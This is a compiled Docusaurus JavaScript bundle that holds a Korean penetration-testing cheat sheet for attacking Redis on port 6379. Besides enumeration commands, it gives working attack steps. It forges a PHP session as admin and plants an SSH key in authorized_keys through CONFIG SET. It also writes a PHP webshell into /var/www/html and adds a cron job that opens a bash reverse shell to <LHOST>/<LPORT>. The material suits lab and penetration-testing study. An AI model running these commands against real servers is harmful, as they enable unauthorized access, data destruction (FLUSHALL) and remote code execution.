"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[5991],{1998:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>o,frontMatter:()=>d,metadata:()=>i,toc:()=>h});const i=JSON.parse('{"id":"Cheatsheet/services/redis","title":"Redis - 6379","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/Cheatsheet/services/redis.md","sourceDirName":"Cheatsheet/services","slug":"/Cheatsheet/services/redis","permalink":"/my-docusaurus-page/Cheatsheet/services/redis","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":12,"frontMatter":{"sidebar_position":12},"sidebar":"tutorialSidebar","previous":{"title":"PostgreSQL - 5432","permalink":"/my-docusaurus-page/Cheatsheet/services/postgresql"},"next":{"title":"LDAP - 389/636","permalink":"/my-docusaurus-page/Cheatsheet/services/ldap"}}');var l=s(4848),r=s(8453);const d={sidebar_position:12},a="Redis - 6379",c={},h=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\uc5f0\uacb0",id:"\uc5f0\uacb0",level:2},{value:"\uc778\uc99d",id:"\uc778\uc99d",level:2},{value:"\uae30\ubcf8 \uba85\ub839\uc5b4",id:"\uae30\ubcf8-\uba85\ub839\uc5b4",level:2},{value:"Hash \uba85\ub839\uc5b4",id:"hash-\uba85\ub839\uc5b4",level:2},{value:"PHP \uc138\uc158 \uc870\uc791",id:"php-\uc138\uc158-\uc870\uc791",level:2},{value:"SSH Key \uc0bd\uc785",id:"ssh-key-\uc0bd\uc785",level:2},{value:"Webshell \uc791\uc131",id:"webshell-\uc791\uc131",level:2},{value:"Cron Job\uc744 \ud1b5\ud55c RCE",id:"cron-job\uc744-\ud1b5\ud55c-rce",level:2},{value:"Nmap",id:"nmap",level:2},{value:"redis-cli \uc6d0\uaca9 \uba85\ub839 \uc2e4\ud589",id:"redis-cli-\uc6d0\uaca9-\uba85\ub839-\uc2e4\ud589",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function t(e){const n={code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"redis---6379",children:"Redis - 6379"})}),"\n",(0,l.jsx)(n.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\ud3ec\ud2b8"}),": 6379"]}),"\n",(0,l.jsx)(n.p,{children:"Redis\ub294 \uc778\uba54\ubaa8\ub9ac \ud0a4-\uac12 \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc785\ub2c8\ub2e4."}),"\n",(0,l.jsx)(n.h2,{id:"\uc5f0\uacb0",children:"\uc5f0\uacb0"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# Redis CLI \uc5f0\uacb0\nredis-cli -h <RHOST>\n\n# \ud3ec\ud2b8 \uc9c0\uc815\nredis-cli -h <RHOST> -p 6379\n\n# \ube44\ubc00\ubc88\ud638 \uc9c0\uc815\nredis-cli -h <RHOST> -a <PASSWORD>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\uc778\uc99d",children:"\uc778\uc99d"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# \ube44\ubc00\ubc88\ud638 \uc778\uc99d\n> AUTH <PASSWORD>\n\n# \uc0ac\uc6a9\uc790\uba85 + \ube44\ubc00\ubc88\ud638 (Redis 6.0+)\n> AUTH <USERNAME> <PASSWORD>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\uae30\ubcf8-\uba85\ub839\uc5b4",children:"\uae30\ubcf8 \uba85\ub839\uc5b4"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# \uc11c\ubc84 \uc815\ubcf4\n> INFO SERVER\n\n# Keyspace \uc815\ubcf4\n> INFO keyspace\n\n# \ubaa8\ub4e0 \uc124\uc815 \ud655\uc778\n> CONFIG GET *\n\n# \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc120\ud0dd\n> SELECT <NUMBER>\n\n# \ubaa8\ub4e0 \ud0a4 \uc870\ud68c\n> KEYS *\n\n# \ud0a4 \uac12 \uc870\ud68c\n> GET <KEY>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"hash-\uba85\ub839\uc5b4",children:"Hash \uba85\ub839\uc5b4"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# \ud544\ub4dc \uc124\uc815\n> HSET <KEY> <FIELD> <VALUE>\n\n# \ud544\ub4dc \uac12 \uc870\ud68c\n> HGET <KEY> <FIELD>\n\n# \ubaa8\ub4e0 \ud544\ub4dc \uc774\ub984 \uc870\ud68c\n> HKEYS <KEY>\n\n# \ubaa8\ub4e0 \ud544\ub4dc\uc640 \uac12 \uc870\ud68c\n> HGETALL <KEY>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"php-\uc138\uc158-\uc870\uc791",children:"PHP \uc138\uc158 \uc870\uc791"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'# \uc138\uc158 \uc870\ud68c\n> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b\n\n# \uc138\uc158 \uc124\uc815 (\uad00\ub9ac\uc790 \uad8c\ud55c \uc0c1\uc2b9)\n> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\\"<USERNAME>\\";role|s:5:\\"admin\\";auth|s:4:\\"True\\";"\n\n# \uc8fc\uc758: "s:8"\uc740 \uc0ac\uc6a9\uc790\uba85 \uae38\uc774\uc640 \uc77c\uce58\ud574\uc57c \ud568\n'})}),"\n",(0,l.jsx)(n.h2,{id:"ssh-key-\uc0bd\uc785",children:"SSH Key \uc0bd\uc785"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'# Redis CLI \uc5f0\uacb0\nredis-cli -h <RHOST>\n\n# \uae30\uc874 \ub370\uc774\ud130 \uc0ad\uc81c\necho "FLUSHALL" | redis-cli -h <RHOST>\n\n# SSH \uacf5\uac1c\ud0a4 \uc900\ube44\n(echo -e "\\n\\n"; cat ~/.ssh/id_rsa.pub; echo -e "\\n\\n") > /tmp/spub.txt\n\n# Redis\uc5d0 \ud0a4 \uc800\uc7a5\ncat /tmp/spub.txt | redis-cli -h <RHOST> -x set s-key\n\n# Redis \ub0b4\ubd80\uc5d0\uc11c \uc791\uc5c5\nredis-cli -h <RHOST>\n'})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'# \ud0a4 \ud655\uc778\n<RHOST>:6379> get s-key\n\n# \ud604\uc7ac \ub514\ub809\ud1a0\ub9ac \ud655\uc778\n<RHOST>:6379> CONFIG GET dir\n1) "dir"\n2) "/var/lib/redis"\n\n# .ssh \ub514\ub809\ud1a0\ub9ac\ub85c \ubcc0\uacbd\n<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh\nOK\n\n# \ud30c\uc77c\uba85\uc744 authorized_keys\ub85c \uc124\uc815\n<RHOST>:6379> CONFIG SET dbfilename authorized_keys\nOK\n\n# \uc124\uc815 \ud655\uc778\n<RHOST>:6379> CONFIG GET dbfilename\n1) "dbfilename"\n2) "authorized_keys"\n\n# \uc800\uc7a5\n<RHOST>:6379> save\nOK\n'})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# SSH \ub85c\uadf8\uc778\nssh redis@<RHOST>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"webshell-\uc791\uc131",children:"Webshell \uc791\uc131"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# PHP Webshell \uc791\uc131\nredis-cli -h <RHOST>\n> CONFIG SET dir /var/www/html\n> CONFIG SET dbfilename shell.php\n> SET test \"<?php system($_GET['cmd']); ?>\"\n> save\n\n# \uc811\uc18d: http://<RHOST>/shell.php?cmd=id\n"})}),"\n",(0,l.jsx)(n.h2,{id:"cron-job\uc744-\ud1b5\ud55c-rce",children:"Cron Job\uc744 \ud1b5\ud55c RCE"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'redis-cli -h <RHOST>\n> CONFIG SET dir /var/spool/cron\n> CONFIG SET dbfilename root\n> SET xxx "\\n* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\\n"\n> save\n'})}),"\n",(0,l.jsx)(n.h2,{id:"nmap",children:"Nmap"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# Redis \ubc84\uc804 \ud655\uc778\nsudo nmap -p6379 -sV <RHOST>\n\n# Redis \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p6379 --script redis-info <RHOST>\n"})}),"\n",(0,l.jsx)(n.h2,{id:"redis-cli-\uc6d0\uaca9-\uba85\ub839-\uc2e4\ud589",children:"redis-cli \uc6d0\uaca9 \uba85\ub839 \uc2e4\ud589"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# \uba85\ub839 \uc2e4\ud589\nredis-cli -h <RHOST> INFO\nredis-cli -h <RHOST> CONFIG GET *\nredis-cli -h <RHOST> KEYS *\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\uc778\uc99d \uc5c6\ub294 Redis \ud655\uc778"}),"\n",(0,l.jsx)(n.li,{children:"CONFIG \uba85\ub839 \uc0ac\uc6a9 \uac00\ub2a5 \uc5ec\ubd80"}),"\n",(0,l.jsx)(n.li,{children:"Redis \uc2e4\ud589 \uc0ac\uc6a9\uc790 \ud655\uc778 (root\uc778 \uacbd\uc6b0 \ub354 \uc704\ud5d8)"}),"\n",(0,l.jsx)(n.li,{children:"\uc4f0\uae30 \uac00\ub2a5\ud55c \ub514\ub809\ud1a0\ub9ac \ud655\uc778"}),"\n",(0,l.jsx)(n.li,{children:"PHP \uc138\uc158 \uc870\uc791\uc744 \ud1b5\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,l.jsx)(n.li,{children:"SSH Key \uc0bd\uc785"}),"\n",(0,l.jsx)(n.li,{children:"Webshell \uc791\uc131"}),"\n",(0,l.jsx)(n.li,{children:"Cron Job \uc545\uc6a9"}),"\n"]})]})}function o(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(t,{...e})}):t(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>a});var i=s(6540);const l={},r=i.createContext(l);function d(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:d(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);